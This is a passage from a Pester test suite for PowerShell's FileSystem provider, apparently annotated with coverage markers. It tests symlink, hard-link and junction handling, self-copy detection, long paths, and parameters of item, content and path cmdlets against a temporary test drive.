         -||-> It "Get-ChildItem will recurse into symlinks given -FollowSymlink, avoiding link loops" {
             -||-> New-Item -ItemType Directory -Path $gammaDir <-||- 
             -||-> New-Item -ItemType SymbolicLink -Path $uponeLink -Value $betaDir <-||- 
             -||-> New-Item -ItemType SymbolicLink -Path $uptwoLink -Value $alphaDir <-||- 
             -||-> New-Item -ItemType SymbolicLink -Path $omegaLink -Value $omegaDir <-||- 
             -||-> $ci =  -||-> Get-ChildItem -Path $alphaDir -FollowSymlink -Recurse -WarningVariable w -WarningAction SilentlyContinue <-||-  <-||- 
             -||-> $ci.Count | Should -BeExactly 13 <-||- 
             -||-> $w.Count | Should -BeExactly 3 <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Remove-Item and hard/symbolic links" {
         -||-> BeforeAll {
             -||-> $testCases = @(
                 -||-> @{
                    Name =  -||-> "Remove-Item can remove a hard link to a file" <-||- 
                    Link =  -||-> $hardLinkToFile <-||- 
                    Target =  -||-> $realFile <-||- 
                } <-||- 
                 -||-> @{
                    Name =  -||-> "Remove-Item can remove a symbolic link to a file" <-||- 
                    Link =  -||-> $symLinkToFile <-||- 
                    Target =  -||-> $realFile <-||- 
                } <-||- 
            ) <-||- 

            
             -||-> $unixTestCases = @(
                 -||-> @{
                    Name =  -||-> "Remove-Item can remove a symbolic link to a directory on Unix" <-||- 
                    Link =  -||-> $symLinkToDir <-||- 
                    Target =  -||-> $realDir <-||- 
                } <-||- 
            ) <-||- 

            
             -||-> $windowsTestCases = @(
                 -||-> @{
                    Name =  -||-> "Remove-Item can remove a symbolic link to a directory on Windows" <-||- 
                    Link =  -||-> $symLinkToDir <-||- 
                    Target =  -||-> $realDir <-||- 
                } <-||- 
                 -||-> @{
                    Name =  -||-> "Remove-Item can remove a directory symbolic link to a directory on Windows" <-||- 
                    Link =  -||-> $dirSymLinkToDir <-||- 
                    Target =  -||-> $realDir <-||- 
                } <-||- 
                 -||-> @{
                    Name =  -||-> "Remove-Item can remove a junction to a directory" <-||- 
                    Link =  -||-> $junctionToDir <-||- 
                    Target =  -||-> $realDir <-||- 
                } <-||- 
            ) <-||- 

             -||-> function TestRemoveItem
            {
                Param (
                    [string]$Link,
                    [string]$Target
                )

                 -||-> Remove-Item -Path $Link -ErrorAction SilentlyContinue > $null <-||- 
                 -||-> Test-Path -Path $Link | Should -BeFalse <-||- 
                 -||-> Test-Path -Path $Target | Should -BeTrue <-||- 
            } <-||- 
        } <-||- 

         -||-> It "<Name>" -TestCases $testCases {
            Param (
                [string]$Name,
                [string]$Link,
                [string]$Target
            )

             -||-> TestRemoveItem $Link $Target <-||- 
        } <-||- 

         -||-> It "<Name>" -TestCases $unixTestCases -Skip:( -||-> $IsWindows <-||- ) {
            Param (
                [string]$Name,
                [string]$Link,
                [string]$Target
            )

             -||-> TestRemoveItem $Link $Target <-||- 
        } <-||- 

         -||-> It "<Name>" -TestCases $windowsTestCases -Skip:( -||-> -not $IsWindows <-||- ) {
            Param (
                [string]$Name,
                [string]$Link,
                [string]$Target
            )

             -||-> TestRemoveItem $Link $Target <-||- 
        } <-||- 

         -||-> It "Remove-Item ignores -Recurse switch when deleting symlink to directory" {
             -||-> $folder =  -||-> Join-Path $TestDrive "folder" <-||-  <-||- 
             -||-> $file =  -||-> Join-Path $TestDrive "folder" "file" <-||-  <-||- 
             -||-> $link =  -||-> Join-Path $TestDrive "sym-to-folder" <-||-  <-||- 
             -||-> New-Item -ItemType Directory -Path $folder > $null <-||- 
             -||-> New-Item -ItemType File -Path $file -Value "some content" > $null <-||- 
             -||-> New-Item -ItemType SymbolicLink -Path $link -value $folder > $null <-||- 
             -||-> $childA =  -||-> Get-Childitem $folder <-||-  <-||- 
             -||-> Remove-Item -Path $link -Recurse <-||- 
             -||-> $childB =  -||-> Get-ChildItem $folder <-||-  <-||- 
             -||-> $childB.Count | Should -Be 1 <-||- 
             -||-> $childB.Count | Should -BeExactly $childA.Count <-||- 
             -||-> $childB.Name | Should -BeExactly $childA.Name <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Copy-Item can avoid copying an item onto itself" -Tags "CI", "RequireAdminOnWindows" {
     -||-> BeforeAll {
        
        
         -||-> $isCaseSensitive = $IsLinux <-||- 

        
        
         -||-> $selfCopyKey = "SelfCopy" <-||- 

         -||-> $subDir = "$TestDrive/sub" <-||- 
         -||-> $otherSubDir = "$TestDrive/other-sub" <-||- 
         -||-> $fileName = "file.txt" <-||- 
         -||-> $filePath = "$TestDrive/$fileName" <-||- 
         -||-> $otherFileName = "other-file" <-||- 
         -||-> $otherFile = "$otherSubDir/$otherFileName" <-||- 
         -||-> $symToOther = "$subDir/sym-to-other" <-||- 
         -||-> $secondSymToOther = "$subDir/another-sym-to-other" <-||- 
         -||-> $symToSym = "$subDir/sym-to-sym-to-other" <-||- 
         -||-> $symToOtherFile = "$subDir/sym-to-other-file" <-||- 
         -||-> $hardToOtherFile = "$subDir/hard-to-other-file" <-||- 
         -||-> $symdToOther = "$subDir/symd-to-other" <-||- 
         -||-> $junctionToOther = "$subDir/junction-to-other" <-||- 

         -||-> New-Item -ItemType File $filePath -Value "stuff" > $null <-||- 
         -||-> New-Item -ItemType Directory $subDir > $null <-||- 
         -||-> New-Item -ItemType Directory $otherSubDir > $null <-||- 
         -||-> New-Item -ItemType File $otherFile -Value "some text" > $null <-||- 
         -||-> New-Item -ItemType SymbolicLink $symToOther -Value $otherSubDir > $null <-||- 
         -||-> New-Item -ItemType SymbolicLink $secondSymToOther -Value $otherSubDir > $null <-||- 
         -||-> New-Item -ItemType SymbolicLink $symToSym -Value $symToOther > $null <-||- 
         -||-> New-Item -ItemType SymbolicLink $symToOtherFile -Value $otherFile > $null <-||- 
         -||-> New-Item -ItemType HardLink $hardToOtherFile -Value $otherFile > $null <-||- 

         -||-> if ( -||-> $IsWindows <-||- )
        {
             -||-> New-Item -ItemType Junction $junctionToOther -Value $otherSubDir > $null <-||- 
             -||-> New-Item -ItemType SymbolicLink $symdToOther -Value $otherSubDir > $null <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Copy-Item using different case (on case-sensitive file systems)" {
         -||-> BeforeEach {
             -||-> $sourcePath = $filePath <-||- 
             -||-> $destinationPath = "$TestDrive/" + $fileName.Toupper() <-||- 
        } <-||- 
         -||-> AfterEach {
             -||-> Remove-Item -Path $destinationPath -ErrorAction SilentlyContinue <-||- 
        } <-||- 

         -||-> It "Copy-Item can copy to file name differing only by case" {
             -||-> if ( -||-> $isCaseSensitive <-||- )
            {
                 -||-> Copy-Item -Path $sourcePath -Destination $destinationPath -ErrorAction SilentlyContinue | Should -BeNullOrEmpty <-||- 
                 -||-> Test-Path -Path $destinationPath | Should -BeTrue <-||- 
            }
            else
            {
                 -||-> {  -||-> Copy-Item -Path $sourcePath -Destination $destinationPath -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "CopyError,Microsoft.PowerShell.Commands.CopyItemCommand" <-||- 
                 -||-> $Error[0].Exception | Should -BeOfType System.IO.IOException <-||- 
                 -||-> $Error[0].Exception.Data[$selfCopyKey] | Should -Not -BeNullOrEmpty <-||- 
            } <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Copy-Item avoids copying an item onto itself" {
         -||-> BeforeAll {
             -||-> $testCases = @(
                 -||-> @{
                    Name =  -||-> "Copy to same path" <-||- 
                    Source =  -||-> $otherFile <-||- 
                    Destination =  -||-> $otherFile <-||- 
                } <-||- 
                 -||-> @{
                    Name =  -||-> "Copy hard link" <-||- 
                    Source =  -||-> $hardToOtherFile <-||- 
                    Destination =  -||-> $otherFile <-||- 
                } <-||- 
                 -||-> @{
                    Name =  -||-> "Copy hard link, reversed" <-||- 
                    Source =  -||-> $otherFile <-||- 
                    Destination =  -||-> $hardToOtherFile <-||- 
                } <-||- 
                 -||-> @{
                    Name =  -||-> "Copy symbolic link to target" <-||- 
                    Source =  -||-> $symToOtherFile <-||- 
                    Destination =  -||-> $otherFile <-||- 
                } <-||- 
                 -||-> @{
                    Name =  -||-> "Copy symbolic link to symbolic link with same target" <-||- 
                    Source =  -||-> $secondSymToOther <-||- 
                    Destination =  -||-> $symToOther <-||- 
                } <-||- 
                 -||-> @{
                    Name =  -||-> "Copy through chain of symbolic links" <-||- 
                    Source =  -||-> $symToSym <-||- 
                    Destination =  -||-> $otherSubDir <-||- 
                } <-||- 
            ) <-||- 

            
             -||-> $windowsTestCases = @(
                 -||-> @{
                    Name =  -||-> "Copy junction to target" <-||- 
                    Source =  -||-> $junctionToOther <-||- 
                    Destination =  -||-> $otherSubDir <-||- 
                } <-||- 
                 -||-> @{
                    Name =  -||-> "Copy directory symbolic link to target" <-||- 
                    Source =  -||-> $symdToOther <-||- 
                    Destination =  -||-> $otherSubDir <-||- 
                } <-||- 
            ) <-||- 

             -||-> function TestSelfCopy
            {
                Param (
                    [string]$Source,
                    [string]$Destination
                )

                 -||-> {  -||-> Copy-Item -Path $Source -Destination $Destination -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "CopyError,Microsoft.PowerShell.Commands.CopyItemCommand" <-||- 
                 -||-> $Error[0].Exception | Should -BeOfType System.IO.IOException <-||- 
                 -||-> $Error[0].Exception.Data[$selfCopyKey] | Should -Not -BeNullOrEmpty <-||- 
            } <-||- 
        } <-||- 

         -||-> It "<Name>" -TestCases $testCases {
            Param (
                [string]$Name,
                [string]$Source,
                [string]$Destination
            )

             -||-> TestSelfCopy $Source $Destination <-||- 
        } <-||- 

         -||-> It "<Name>" -TestCases $windowsTestCases -Skip:( -||-> -not $IsWindows <-||- ) {
            Param (
                [string]$Name,
                [string]$Source,
                [string]$Destination
            )

             -||-> TestSelfCopy $Source $Destination <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Handling long paths" -Tags "CI" {
     -||-> BeforeAll {
         -||-> $longDir = 'a' * 250 <-||- 
         -||-> $longSubDir = 'b' * 250 <-||- 
         -||-> $fileName = "file1.txt" <-||- 
         -||-> $topPath =  -||-> Join-Path $TestDrive $longDir <-||-  <-||- 
         -||-> $longDirPath =  -||-> Join-Path $topPath $longSubDir <-||-  <-||- 
         -||-> $longFilePath =  -||-> Join-Path $longDirPath $fileName <-||-  <-||- 
         -||-> $cwd =  -||-> Get-Location <-||-  <-||- 
    } <-||- 
     -||-> BeforeEach {
         -||-> New-Item -ItemType File -Path $longFilePath -Force | Out-Null <-||- 
    } <-||- 
     -||-> AfterEach {
         -||-> Remove-Item -Path $topPath -Force -Recurse -ErrorAction SilentlyContinue <-||- 
         -||-> Set-Location $cwd <-||- 
    } <-||- 

     -||-> It "Can remove a file via a long path" {
         -||-> Remove-Item -Path $longFilePath -ErrorVariable e -ErrorAction SilentlyContinue <-||- 
         -||-> $e | Should -BeNullOrEmpty <-||- 
         -||-> $longFilePath | Should -Not -Exist <-||- 
    } <-||- 
     -||-> It "Can rename a file via a long path" {
         -||-> $newFileName = "new-file.txt" <-||- 
         -||-> $newPath =  -||-> Join-Path $longDirPath $newFileName <-||-  <-||- 
         -||-> Rename-Item -Path $longFilePath -NewName $newFileName <-||- 
         -||-> $longFilePath | Should -Not -Exist <-||- 
         -||-> $newPath | Should -Exist <-||- 
    } <-||- 
     -||-> It "Can change into a directory via a long path" {
         -||-> Set-Location -Path $longDirPath -ErrorVariable e -ErrorAction SilentlyContinue <-||- 
         -||-> $e | Should -BeNullOrEmpty <-||- 
         -||-> $c =  -||-> Get-Location <-||-  <-||- 
         -||-> $fileName | Should -Exist <-||- 
    } <-||- 
     -||-> It "Can use Test-Path to check for a file via a long path" {
         -||-> Test-Path $longFilePath | Should -BeTrue <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Extended FileSystem Item/Content Cmdlet Provider Tests" -Tags "Feature" {
     -||-> BeforeAll {
         -||-> $testDir = "testDir" <-||- 
         -||-> $testFile = "testFile.txt" <-||- 
         -||-> $testFile2 = "testFile2.txt" <-||- 
         -||-> $testContent = "Test 1" <-||- 
         -||-> $testContent2 = "Test 2" <-||- 
         -||-> $restoreLocation =  -||-> Get-Location <-||-  <-||- 
    } <-||- 

     -||-> AfterAll {
        
         -||-> Set-Location -Path $restoreLocation <-||- 
    } <-||- 

     -||-> BeforeEach {
         -||-> Set-Location -Path "TestDrive:\" <-||- 
         -||-> New-Item -Path $testFile -ItemType File > $null <-||- 
         -||-> New-Item -Path $testFile2 -ItemType File > $null <-||- 
    } <-||- 

     -||-> AfterEach {
         -||-> Set-Location -Path "TestDrive:\" <-||- 
         -||-> Remove-Item -Path * -Recurse -Force -ErrorAction SilentlyContinue <-||- 
    } <-||- 

     -||-> Context "Valdiate New-Item parameters" {
         -||-> BeforeEach {
            
             -||-> Remove-Item -Path * -Recurse -Force -ErrorAction SilentlyContinue <-||- 
        } <-||- 

         -||-> It "Verify Directory + Whatif" {
             -||-> New-Item -Path . -ItemType Directory -Name $testDir -WhatIf > $null <-||- 
             -||-> {  -||-> Get-Item -Path $testDir -ErrorAction Stop <-||-  } |
                Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand" <-||- 
        } <-||- 

         -||-> It "Verify Directory + Confirm bypass" {
             -||-> $result =  -||-> New-Item -Path . -ItemType Directory -Name $testDir -Confirm:$false <-||-  <-||- 
             -||-> $result.Name | Should -BeExactly $testDir <-||- 
        } <-||- 

         -||-> It "Verify Directory + Force" {
             -||-> New-Item -Path . -ItemType Directory -Name $testDir > $null <-||- 
             -||-> $result =  -||-> New-Item -Path . -ItemType Directory -Name $testDir -Force <-||-  <-||-  
             -||-> $result.Name | Should -BeExactly $testDir <-||- 
        } <-||- 

         -||-> It "Verify File + Value" {
             -||-> $result =  -||-> New-Item -Path . -ItemType File -Name $testFile -Value "Some String" <-||-  <-||- 
             -||-> $content =  -||-> Get-Content -Path $testFile <-||-  <-||- 
             -||-> $result.Name | Should -BeExactly $testFile <-||- 
             -||-> $content | Should -BeExactly "Some String" <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Valdiate Get-Item parameters" {
         -||-> It "Verify Force" {
             -||-> $result =  -||-> Get-Item -Path $testFile -Force <-||-  <-||- 
             -||-> $result.Name | Should -BeExactly $testFile <-||- 
        } <-||- 

         -||-> It "Verify Path Wildcard" {
             -||-> $result =  -||-> Get-Item -Path "*2.txt" <-||-  <-||- 
             -||-> $result.Name | Should -BeExactly $testFile2 <-||- 
        } <-||- 

         -||-> It "Verify Include" {
             -||-> $result =  -||-> Get-Item -Path "TestDrive:\*" -Include "*2.txt" <-||-  <-||- 
             -||-> $result.Name | Should -BeExactly $testFile2 <-||- 
        } <-||- 

         -||-> It "Verify Include and Exclude Intersection" {
             -||-> $result =  -||-> Get-Item -Path "TestDrive:\*" -Include "*.txt" -Exclude "*2*" <-||-  <-||- 
             -||-> $result.Name | Should -BeExactly $testFile <-||- 
        } <-||- 

         -||-> It "Verify Filter" {
             -||-> $result =  -||-> Get-Item -Path "TestDrive:\*" -filter "*2.txt" <-||-  <-||- 
             -||-> $result.Name | Should -BeExactly $testFile2 <-||- 
        } <-||- 

         -||-> It "Verify -LiteralPath with wildcard fails for file that doesn't exist" {
             -||-> {  -||-> Get-Item -LiteralPath "a*b.txt" -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand" <-||- 
        } <-||- 

         -||-> It "Verify -LiteralPath with wildcard succeeds for file" -Skip:( -||-> $IsWindows <-||- ) {
             -||-> New-Item -Path "$testdrive\a*b.txt" -ItemType File > $null <-||- 
             -||-> $file =  -||-> Get-Item -LiteralPath "$testdrive\a*b.txt" <-||-  <-||- 
             -||-> $file.Name | Should -BeExactly "a*b.txt" <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Valdiate Move-Item parameters" {
         -||-> BeforeAll {
             -||-> $altTestFile = "movedFile.txt" <-||- 
        } <-||- 

         -||-> BeforeEach {
             -||-> New-Item -Path $testFile -ItemType File -Force > $null <-||- 
             -||-> New-Item -Path $testFile2 -ItemType File -Force > $null <-||- 
        } <-||- 

         -||-> AfterEach {
             -||-> Remove-Item -Path * -Recurse -Force -ErrorAction SilentlyContinue <-||- 
        } <-||- 

         -||-> It "Verify WhatIf" {
             -||-> Move-Item -Path $testFile -Destination $altTestFile -WhatIf <-||- 
             -||-> {  -||-> Get-Item -Path $altTestFile -ErrorAction Stop <-||-  } |
                Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand" <-||- 
        } <-||- 

         -||-> It "Verify Include and Exclude Intersection" {
             -||-> New-Item -Path "TestDrive:\dest" -ItemType Directory <-||- 
             -||-> Move-Item -Path "TestDrive:\*" -Destination "TestDrive:\dest" -Include "*.txt" -Exclude "*2*" <-||- 
             -||-> $file1 =  -||-> Get-Item "TestDrive:\dest\$testFile2" -ErrorAction SilentlyContinue <-||-  <-||- 
             -||-> $file2 =  -||-> Get-Item "TestDrive:\dest\$testFile" -ErrorAction SilentlyContinue <-||-  <-||- 
             -||-> $file1 | Should -BeNullOrEmpty <-||- 
             -||-> $file2.Name | Should -BeExactly $testFile <-||- 
        } <-||- 

         -||-> It "Verify Filter" {
             -||-> Move-Item -Path "TestDrive:\*" -Filter "*2.txt" -Destination $altTestFile <-||- 
             -||-> $file1 =  -||-> Get-Item $testFile2 -ErrorAction SilentlyContinue <-||-  <-||- 
             -||-> $file2 =  -||-> Get-Item $altTestFile -ErrorAction SilentlyContinue <-||-  <-||- 
             -||-> $file1 | Should -BeNullOrEmpty <-||- 
             -||-> $file2.Name | Should -BeExactly $altTestFile <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Valdiate Rename-Item parameters" {
         -||-> BeforeAll {
             -||-> $newFile = "NewName.txt" <-||- 
        } <-||- 

         -||-> It "Verify WhatIf" {
             -||-> Rename-Item -Path $testFile -NewName $newFile -WhatIf <-||- 
             -||-> {  -||-> Get-Item -Path $newFile -ErrorAction Stop <-||-  } |
                Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand" <-||- 
        } <-||- 

         -||-> It "Verify Confirm can be bypassed" {
             -||-> Rename-Item -Path $testFile -NewName $newFile -Confirm:$false <-||- 
             -||-> $file1 =  -||-> Get-Item -Path $testFile -ErrorAction SilentlyContinue <-||-  <-||- 
             -||-> $file2 =  -||-> Get-Item -Path $newFile -ErrorAction SilentlyContinue <-||-  <-||- 
             -||-> $file1 | Should -BeNullOrEmpty <-||- 
             -||-> $file2.Name | Should -BeExactly $newFile <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Valdiate Remove-Item parameters" {
         -||-> It "Verify WhatIf" {
             -||-> Remove-Item $testFile -WhatIf <-||- 
             -||-> $result =  -||-> Get-Item $testFile <-||-  <-||- 
             -||-> $result.Name | Should -BeExactly $testFile <-||- 
        } <-||- 

         -||-> It "Verify Confirm can be bypassed" {
             -||-> Remove-Item $testFile -Confirm:$false <-||- 
             -||-> {  -||-> Get-Item $testFile -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand" <-||- 
        } <-||- 

         -||-> It "Verify LiteralPath" {
             -||-> Remove-Item -LiteralPath "TestDrive:\$testFile" -Recurse <-||- 
             -||-> {  -||-> Get-Item $testFile -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand" <-||- 
        } <-||- 

         -||-> It "Verify Filter" {
             -||-> Remove-Item "TestDrive:\*" -Filter "*.txt" <-||- 
             -||-> $result =  -||-> Get-Item "TestDrive:\*.txt" <-||-  <-||- 
             -||-> $result | Should -BeNullOrEmpty <-||- 
        } <-||- 

         -||-> It "Verify Include" {
             -||-> Remove-Item "TestDrive:\*" -Include "*2.txt" <-||- 
             -||-> {  -||-> Get-Item $testFile2 -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand" <-||- 
        } <-||- 

         -||-> It "Verify Include and Exclude Intersection" {
             -||-> Remove-Item "TestDrive:\*" -Include "*.txt" -exclude "*2*" <-||- 
             -||-> $file1 =  -||-> Get-Item $testFile -ErrorAction SilentlyContinue <-||-  <-||- 
             -||-> $file2 =  -||-> Get-Item $testFile2 -ErrorAction SilentlyContinue <-||-  <-||- 
             -||-> $file1 | Should -BeNullOrEmpty <-||- 
             -||-> $file2.Name | Should -BeExactly $testFile2 <-||- 
        } <-||- 

         -||-> It "Verify Path can accept wildcard" {
             -||-> Remove-Item "TestDrive:\*.txt" -Recurse -Force <-||- 
             -||-> $result =  -||-> Get-ChildItem "TestDrive:\*.txt" <-||-  <-||- 
             -||-> $result | Should -BeNullOrEmpty <-||- 
        } <-||- 

         -||-> It "Verify no error if wildcard doesn't match: <path>" -TestCases @(
             -||-> @{path= -||-> "TestDrive:\*.foo" <-||- },
            @{path= -||-> "TestDrive:\[z]" <-||- },
            @{path= -||-> "TestDrive:\z.*" <-||- } <-||- 
        ) {
            param($path)
             -||-> {  -||-> Remove-Item $path <-||-  } | Should -Not -Throw <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Valdiate Set-Content parameters" {
         -||-> It "Validate Array Input for Path and Value" {
             -||-> Set-Content -Path @( -||-> $testFile,$testFile2 <-||- ) -Value @( -||-> $testContent,$testContent2 <-||- ) <-||- 
             -||-> $content1 =  -||-> Get-Content $testFile <-||-  <-||- 
             -||-> $content2 =  -||-> Get-Content $testFile2 <-||-  <-||- 
             -||-> $content1 | Should -BeExactly $content2 <-||- 
             -||-> ( -||-> $content1[0] + $content1[1] <-||- ) | Should -BeExactly ( -||-> $testContent + $testContent2 <-||- ) <-||- 
        } <-||- 

         -||-> It "Validate LiteralPath" {
             -||-> Set-Content -LiteralPath "TestDrive:\$testFile" -Value $testContent <-||- 
             -||-> $content =  -||-> Get-Content $testFile <-||-  <-||- 
             -||-> $content | Should -BeExactly $testContent <-||- 
        } <-||- 

         -||-> It "Validate Confirm can be bypassed" {
             -||-> Set-Content -Path $testFile -Value $testContent -Confirm:$false <-||- 
             -||-> $content =  -||-> Get-Content $testFile <-||-  <-||- 
             -||-> $content | Should -BeExactly $testContent <-||- 
        } <-||- 

         -||-> It "Validate WhatIf" {
             -||-> Set-Content -Path $testFile -Value $testContent -WhatIf <-||- 
             -||-> $content =  -||-> Get-Content $testFile <-||-  <-||- 
             -||-> $content | Should -BeNullOrEmpty <-||- 
        } <-||- 

         -||-> It "Validate Include" {
             -||-> Set-Content -Path "TestDrive:\*" -Value $testContent -Include "*2.txt" <-||- 
             -||-> $content1 =  -||-> Get-Content $testFile <-||-  <-||- 
             -||-> $content2 =  -||-> Get-Content $testFile2 <-||-  <-||- 
             -||-> $content1 | Should -BeNullOrEmpty <-||- 
             -||-> $content2 | Should -BeExactly $testContent <-||- 
        } <-||- 

         -||-> It "Validate Exclude" {
             -||-> Set-Content -Path "TestDrive:\*" -Value $testContent -Exclude "*2.txt" <-||- 
             -||-> $content1 =  -||-> Get-Content $testFile <-||-  <-||- 
             -||-> $content2 =  -||-> Get-Content $testFile2 <-||-  <-||- 
             -||-> $content1 | Should -BeExactly $testContent <-||- 
             -||-> $content2 | Should -BeNullOrEmpty <-||- 
        } <-||- 

         -||-> It "Validate Filter" {
             -||-> Set-Content -Path "TestDrive:\*" -Value $testContent -Filter "*2.txt" <-||- 
             -||-> $content1 =  -||-> Get-Content $testFile <-||-  <-||- 
             -||-> $content2 =  -||-> Get-Content $testFile2 <-||-  <-||- 
             -||-> $content1 | Should -BeNullOrEmpty <-||- 
             -||-> $content2 | Should -BeExactly $testContent <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Valdiate Get-Content parameters" {
         -||-> BeforeEach {
             -||-> Set-Content -Path $testFile -Value $testContent <-||- 
             -||-> Set-Content -Path $testFile2 -Value $testContent2 <-||- 
        } <-||- 

         -||-> It "Validate Array Input for Path" {
             -||-> $result =  -||-> Get-Content -Path @( -||-> $testFile,$testFile2 <-||- ) <-||-  <-||- 
             -||-> $result[0] | Should -BeExactly $testContent <-||- 
             -||-> $result[1] | Should -BeExactly $testContent2 <-||- 
        } <-||- 

         -||-> It "Validate Include" {
             -||-> $result =  -||-> Get-Content -Path "TestDrive:\*" -Include "*2.txt" <-||-  <-||- 
             -||-> $result | Should -BeExactly $testContent2 <-||- 
        } <-||- 

         -||-> It "Validate Exclude" {
             -||-> $result =  -||-> Get-Content -Path "TestDrive:\*" -Exclude "*2.txt" <-||-  <-||- 
             -||-> $result | Should -BeExactly $testContent <-||- 
        } <-||- 

         -||-> It "Validate Filter" {
             -||-> $result =  -||-> Get-Content -Path "TestDrive:\*" -Filter "*2.txt" <-||-  <-||- 
             -||-> $result | Should -BeExactly $testContent2 <-||- 
        } <-||- 

         -||-> It "Validate ReadCount" {
             -||-> Set-Content -Path $testFile -Value "Test Line 1`nTest Line 2`nTest Line 3`nTest Line 4`nTest Line 5`nTest Line 6" <-||- 
             -||-> $result = ( -||-> Get-Content -Path $testFile -ReadCount 2 <-||- ) <-||- 
             -||-> $result[0][0] | Should -BeExactly "Test Line 1" <-||- 
             -||-> $result[0][1] | Should -BeExactly "Test Line 2" <-||- 
             -||-> $result[1][0] | Should -BeExactly "Test Line 3" <-||- 
             -||-> $result[1][1] | Should -BeExactly "Test Line 4" <-||- 
             -||-> $result[2][0] | Should -BeExactly "Test Line 5" <-||- 
             -||-> $result[2][1] | Should -BeExactly "Test Line 6" <-||- 
        } <-||- 

         -||-> It "Validate TotalCount" {
             -||-> Set-Content -Path $testFile -Value "Test Line 1`nTest Line 2`nTest Line 3`nTest Line 4`nTest Line 5`nTest Line 6" <-||- 
             -||-> $result =  -||-> Get-Content -Path $testFile -TotalCount 4 <-||-  <-||- 
             -||-> $result[0] | Should -BeExactly "Test Line 1" <-||- 
             -||-> $result[1] | Should -BeExactly "Test Line 2" <-||- 
             -||-> $result[2] | Should -BeExactly "Test Line 3" <-||- 
             -||-> $result[3] | Should -BeExactly "Test Line 4" <-||- 
             -||-> $result[4] | Should -BeNullOrEmpty <-||- 
        } <-||- 

         -||-> It "Validate Tail" {
             -||-> Set-Content -Path $testFile -Value "Test Line 1`nTest Line 2`nTest Line 3`nTest Line 4`nTest Line 5`nTest Line 6" <-||- 
             -||-> $result =  -||-> Get-Content -Path $testFile -Tail 2 <-||-  <-||- 
             -||-> $result[0] | Should -BeExactly "Test Line 5" <-||- 
             -||-> $result[1] | Should -BeExactly "Test Line 6" <-||- 
             -||-> $result[2] | Should -BeNullOrEmpty <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Extended FileSystem Path/Location Cmdlet Provider Tests" -Tags "Feature" {
     -||-> BeforeAll {
         -||-> $testDir = "testDir" <-||- 
         -||-> $testFile = "testFile.txt" <-||- 
         -||-> $testFile2 = "testFile2.txt" <-||- 
         -||-> $testContent = "Test 1" <-||- 
         -||-> $testContent2 = "Test 2" <-||- 
         -||-> $restoreLocation =  -||-> Get-Location <-||-  <-||- 

        
         -||-> Set-Location -Path "TestDrive:\" <-||- 
         -||-> $level1_0 = "Level1_0" <-||- 
         -||-> $level2_0 = "Level2_0" <-||- 
         -||-> $level2_1 = "Level2_1" <-||- 
         -||-> $fileExt = ".ext" <-||- 
         -||-> $root =  -||-> Join-Path "TestDrive:" "" <-||-  <-||-  
         -||-> $level1_0Full =  -||-> Join-Path $root $level1_0 <-||-  <-||- 
         -||-> $level2_0Full =  -||-> Join-Path $level1_0Full $level2_0 <-||-  <-||- 
         -||-> $level2_1Full =  -||-> Join-Path $level1_0Full $level2_1 <-||-  <-||- 
         -||-> New-Item -Path $level1_0Full -ItemType Directory > $null <-||- 
         -||-> New-Item -Path $level2_0Full -ItemType Directory > $null <-||- 
         -||-> New-Item -Path $level2_1Full -ItemType Directory > $null <-||- 
    } <-||- 

     -||-> AfterAll {
        
         -||-> Set-Location -Path $restoreLocation <-||- 
    } <-||- 

     -||-> BeforeEach {
         -||-> Set-Location -Path "TestDrive:\" <-||- 
    } <-||- 

     -||-> Context "Validate Resolve-Path Cmdlet Parameters" {
         -||-> It "Verify LiteralPath" {
             -||-> $result =  -||-> Resolve-Path -LiteralPath "TestDrive:\" <-||-  <-||- 
             -||-> ( -||-> $result.Path.TrimEnd('/\') <-||- ) | Should -BeExactly "TestDrive:" <-||- 
        } <-||- 

         -||-> It "Verify relative" {
             -||-> $relativePath =  -||-> Resolve-Path -Path . -Relative <-||-  <-||- 
             -||-> $relativePath | Should -BeExactly ( -||-> Join-Path "." "" <-||- ) <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Validate Join-Path Cmdlet Parameters" {
         -||-> It "Validate Resolve" {
             -||-> $result =  -||-> Join-Path -Path . -ChildPath $level1_0 -Resolve <-||-  <-||- 
             -||-> if ( -||-> $IsWindows <-||- ) {
                 -||-> $result | Should -BeExactly "TestDrive:\$level1_0" <-||- 
            }
            else {
                 -||-> $result | Should -BeExactly "TestDrive:/$level1_0" <-||- 
            } <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Validate Split-Path Cmdlet Parameters" {
         -||-> It "Validate Parent" {
             -||-> $result =  -||-> Split-Path -Path $level1_0Full -Parent -Resolve <-||-  <-||- 
             -||-> ( -||-> $result.TrimEnd('/\') <-||- ) | Should -BeExactly "TestDrive:" <-||- 
        } <-||- 

         -||-> It "Validate IsAbsolute" {
             -||-> $resolved =  -||-> Split-Path -Path . -Resolve -IsAbsolute <-||-  <-||- 
             -||-> $unresolved =  -||-> Split-Path -Path . -IsAbsolute <-||-  <-||- 
             -||-> $resolved | Should -BeTrue <-||- 
             -||-> $unresolved | Should -BeFalse <-||- 
        } <-||- 

         -||-> It "Validate Leaf" {
